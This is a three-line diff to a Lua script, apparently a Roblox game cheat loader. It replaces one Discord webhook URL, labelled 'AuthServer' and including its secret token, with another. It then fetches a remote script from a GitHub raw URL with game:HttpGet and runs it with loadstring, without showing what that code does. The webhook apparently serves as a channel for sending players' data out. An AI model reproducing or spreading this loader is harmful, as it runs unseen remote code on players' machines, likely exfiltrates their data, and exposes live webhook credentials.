@@ -1,3 +1,3 @@
 _G.Key = "retaehc_reppus"
-_G.AuthServer = "https://discord.com/api/webhooks/1060188604489543751/yzyUJqSzS5A9mtTrOoY94jWf7dMFO9w0Oy8xAK9H0r_RweQDVMZmlGv2UrkXfM76P8T6" 
+_G.AuthServer = "https://discord.com/api/webhooks/1060194085878648862/SlfJ_3TbeKjcAqFEPbUt3HN6FG_5ykviZa3tlO87A8eFpotYjPolf3-qj0PTRU3ew2Rs" 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
